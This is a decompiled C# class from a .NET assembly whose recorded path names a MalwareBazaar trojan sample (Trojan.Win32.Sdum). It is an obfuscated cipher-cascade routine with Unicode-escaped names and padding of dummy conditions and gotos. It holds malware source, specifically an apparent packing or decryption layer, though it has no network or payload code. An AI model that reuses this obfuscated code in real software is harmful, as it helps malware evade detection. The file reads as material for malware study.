// Decompiled with JetBrains decompiler
// Type:  
// Assembly: Ajlbzsprazkudye, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 074BCB68-5832-4D3E-2067-BA519DB97273
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\VHO-Trojan.Win32.Sdum.gen-36fd0e8cf59c06a46153ef906c1e54f33a10f326cf2f9c803cb2cebe3ce1c597.exe

using System.Security.Cryptography;

internal abstract class \u0008\u2007
{
  private readonly SymmetricAlgorithm[] \u0002;

  public \u0008\u2007(byte[] _param1, long _param2)
  {
    if (true)
      ;
    byte[] numArray1 = _param1;
    if (true)
      ;
    long num = _param2;
    if (true)
      ;
    byte[] numArray2 = \u0008\u2007.\u0002(num);
    // ISSUE: explicit constructor call
    this.\u002Ector(numArray1, numArray2);
  }

  public \u0008\u2007(byte[] _param1, byte[] _param2)
  {
    \u0002\u2001 obj1 = new \u0002\u2001(_param1, _param2, 1);
    if (true)
      goto label_3;
label_1:
    SymmetricAlgorithm[] symmetricAlgorithmArray1 = new SymmetricAlgorithm[5];
    if (true)
      goto label_4;
label_2:
    int index;
    if (true)
      index = 0;
    \u0002\u2001 obj2;
    SymmetricAlgorithm[] symmetricAlgorithmArray2;
    for (; index < 5; ++index)
    {
      \u000E​ obj3 = new \u000E​(new SymmetricAlgorithm[1]
      {
        (SymmetricAlgorithm) new \u0006\u2001()
      });
      obj3.Key = obj2.GetBytes(obj3.KeySize / 8);
      obj3.IV = obj2.GetBytes(obj3.\u0002() / 8);
      symmetricAlgorithmArray2[index] = (SymmetricAlgorithm) obj3;
    }
    this.\u0002 = symmetricAlgorithmArray2;
    return;
label_4:
    symmetricAlgorithmArray2 = symmetricAlgorithmArray1;
    goto label_2;
label_3:
    obj2 = obj1;
    goto label_1;
  }

  protected static int \u0002(int _param0)
  {
    int num = _param0;
    if (true)
      ;
    return (num + 3) / 4 * 4;
  }

  public static int \u0003(int _param0)
  {
    int num = _param0;
    if (true)
      ;
    return \u0008\u2007.\u0002(num + 4);
  }

  protected static byte[] \u0002(long _param0)
  {
    byte[] numArray1 = new byte[8];
    if (true)
      goto label_3;
label_1:
    long num = _param0;
    byte[] numArray2;
    byte[] numArray3 = numArray2;
    if (true)
      goto label_4;
label_2:
    return numArray2;
label_4:
    \u0008\u2007.\u0002(num, numArray3, 0);
    goto label_2;
label_3:
    numArray2 = numArray1;
    goto label_1;
  }

  protected static void \u0002(long _param0, byte[] _param1, int _param2)
  {
    byte[] numArray = _param1;
    if (true)
      ;
    int index = _param2;
    if (true)
      ;
    long num1 = _param0;
    if (true)
      ;
    int num2 = (int) (byte) num1;
    numArray[index] = (byte) num2;
    _param1[_param2 + 1] = (byte) (_param0 >> 8);
    _param1[_param2 + 2] = (byte) (_param0 >> 16);
    _param1[_param2 + 3] = (byte) (_param0 >> 24);
    _param1[_param2 + 4] = (byte) (_param0 >> 32);
    _param1[_param2 + 5] = (byte) (_param0 >> 40);
    _param1[_param2 + 6] = (byte) (_param0 >> 48);
    _param1[_param2 + 7] = (byte) (_param0 >> 56);
  }

  protected static int \u0002(byte[] _param0, int _param1)
  {
    byte[] numArray1 = _param0;
    if (true)
      ;
    int index1 = _param1;
    if (true)
      ;
    int num1 = (int) numArray1[index1];
    byte[] numArray2 = _param0;
    if (true)
      ;
    int index2 = _param1 + 1;
    int num2 = (int) numArray2[index2] << 8;
    return num1 | num2 | (int) _param0[_param1 + 2] << 16 | (int) _param0[_param1 + 3] << 24;
  }

  protected static void \u0002(int _param0, byte[] _param1, int _param2)
  {
    byte[] numArray = _param1;
    if (true)
      ;
    int index = _param2;
    if (true)
      ;
    int num1 = _param0;
    if (true)
      ;
    int num2 = (int) (byte) num1;
    numArray[index] = (byte) num2;
    _param1[_param2 + 1] = (byte) (_param0 >> 8);
    _param1[_param2 + 2] = (byte) (_param0 >> 16);
    _param1[_param2 + 3] = (byte) (_param0 >> 24);
  }

  protected byte[] \u0002(byte[] _param1, bool _param2)
  {
    if (_param2)
    {
      SymmetricAlgorithm[] symmetricAlgorithmArray1 = this.\u0002;
      if (true)
        goto label_3;
label_2:
      int index;
      if (true)
        index = 0;
      SymmetricAlgorithm[] symmetricAlgorithmArray2;
      for (; index < symmetricAlgorithmArray2.Length; ++index)
      {
        SymmetricAlgorithm symmetricAlgorithm1 = symmetricAlgorithmArray2[index];
        if (true)
          goto label_7;
label_6:
        SymmetricAlgorithm symmetricAlgorithm2;
        if (_param2)
        {
          using (ICryptoTransform encryptor = symmetricAlgorithm2.CreateEncryptor())
            _param1 = encryptor.TransformFinalBlock(_param1, 0, _param1.Length);
        }
        else
        {
          using (ICryptoTransform decryptor = symmetricAlgorithm2.CreateDecryptor())
            _param1 = decryptor.TransformFinalBlock(_param1, 0, _param1.Length);
        }
        _param2 = !_param2;
        continue;
label_7:
        symmetricAlgorithm2 = symmetricAlgorithm1;
        goto label_6;
      }
      goto label_34;
label_3:
      symmetricAlgorithmArray2 = symmetricAlgorithmArray1;
      goto label_2;
    }
    else
    {
      for (int index = 4; index >= 0; --index)
      {
        SymmetricAlgorithm symmetricAlgorithm = this.\u0002[index];
        if (_param2)
        {
          using (ICryptoTransform encryptor = symmetricAlgorithm.CreateEncryptor())
            _param1 = encryptor.TransformFinalBlock(_param1, 0, _param1.Length);
        }
        else
        {
          using (ICryptoTransform decryptor = symmetricAlgorithm.CreateDecryptor())
            _param1 = decryptor.TransformFinalBlock(_param1, 0, _param1.Length);
        }
        _param2 = !_param2;
      }
    }
label_34:
    return _param1;
  }
}
